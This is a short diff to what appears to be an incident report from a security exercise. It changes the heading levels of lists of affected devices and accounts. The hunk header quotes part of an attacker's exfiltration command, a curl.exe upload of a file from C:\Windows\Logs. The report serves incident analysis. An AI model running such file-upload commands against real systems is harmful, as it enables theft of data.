@@ -63,10 +63,10 @@ Exfiltration steps were then initiated by `"curl.exe" -F file=@C:\Windows\Logs\C
 ## Affected Systems & Data
 Due to insufficient network access controls, the unauthorized entity established initial access and waited (dwell time), before continuing operations. The threat actor successfully gained access over the following:
 
-## Devices:
+### Devices:
 - `azuki-sl`
 - `azuki-fileserver01`
-## Accounts:
+### Accounts:
 - `fileadmin`
 - `kenji.sato`
   
